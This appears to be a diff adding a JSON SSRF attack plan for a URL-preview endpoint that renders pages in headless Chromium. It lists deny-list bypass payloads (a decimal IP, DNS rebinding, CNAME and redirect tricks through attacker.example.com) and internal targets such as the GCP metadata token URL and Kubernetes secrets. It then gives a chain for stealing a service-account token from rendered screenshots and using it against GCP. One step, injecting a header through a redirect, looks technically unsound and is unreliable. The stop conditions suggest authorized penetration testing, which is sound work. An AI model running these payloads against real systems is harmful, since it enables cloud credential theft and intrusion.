@@ -1,0 +1,59 @@
+{
+  "primitive": "POST /api/v1/preview accepts a user-supplied url and renders it via headless Chromium, returning a screenshot URL.",
+  "fetcher": "preview_image",
+  "egress": "partial",
+  "filters_observed": [
+    "regex `^https?://[a-z0-9.-]+/.*`",
+    "deny-list: 169.254.169.254, localhost, 127.0.0.1, metadata.google.internal, 10., 192.168., 172.16., ::1"
+  ],
+  "bypass_techniques": [
+    {
+      "id": "decimal_ip",
+      "evidence": "Deny-list matches dotted-quad strings; decimal IP 2852039166 resolves to 169.254.169.254 but is not blocked.",
+      "test_payload": "https://2852039166/computeMetadata/v1/instance/service-accounts/default/token"
+    },
+    {
+      "id": "dns_rebinding",
+      "evidence": "Headless Chromium follows fresh DNS for sub-resources after the initial allow check.",
+      "test_payload": "https://rebind.attacker.example.com/  (A records flip 1.1.1.1 -> 169.254.169.254 on second lookup)"
+    },
+    {
+      "id": "cname_to_internal",
+      "evidence": "Regex allows any host matching [a-z0-9.-]+; an attacker domain CNAMEd to metadata.google.internal passes the regex while resolving internally.",
+      "test_payload": "https://meta.attacker.example.com/computeMetadata/v1/instance/  (CNAME -> metadata.google.internal)"
+    },
+    {
+      "id": "redirect_to_internal",
+      "evidence": "Headless browser follows 30x redirects; only the initial URL is filtered.",
+      "test_payload": "https://attacker.example.com/ssrf -> 302 -> http://metadata.google.internal/computeMetadata/v1/instance/?alt=json"
+    }
+  ],
+  "internal_targets": [
+    {
+      "service": "gcp_metadata",
+      "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+      "expected_signal": "Screenshot containing JSON with access_token / expires_in keys, or a network log showing a 200 from this host."
+    },
+    {
+      "service": "gcp_metadata",
+      "url": "http://169.254.169.254/computeMetadata/v1/instance/?recursive=true&alt=json",
+      "expected_signal": "Screenshot showing nested JSON tree of project_id, network interfaces, attached service accounts."
+    },
+    {
+      "service": "kubernetes_api",
+      "url": "https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
+      "expected_signal": "401/403 with Kubernetes-style error JSON proves egress to cluster API; pivot from there."
+    }
+  ],
+  "chain": [
+    "Confirm SSRF reach by sending url=https://burpcollaborator.<id>.oastify.com and watching for an HTTP hit.",
+    "Bypass deny-list with decimal IP payload; if blocked, swap to attacker-controlled CNAME pointing at metadata.google.internal.",
+    "Render http://metadata.google.internal/computeMetadata/v1/instance/?recursive=true&alt=json with the GCP-required Metadata-Flavor header injected via redirect target.",
+    "Pull screenshot URL from /api/v1/preview response and OCR it (or scrape the cdn.example.com PNG) to recover the service-account token.",
+    "Use the SA token against the GCP API to enumerate buckets/secrets reachable from this VM."
+  ],
+  "stop_conditions": [
+    "Any 200 response from a 169.254.169.254 / metadata.google.internal request is a confirmed cloud-metadata SSRF — stop testing and report.",
+    "Recovery of a real service-account access_token is the end state — do not exercise the token beyond a single read-only listProjects call."
+  ]
+}
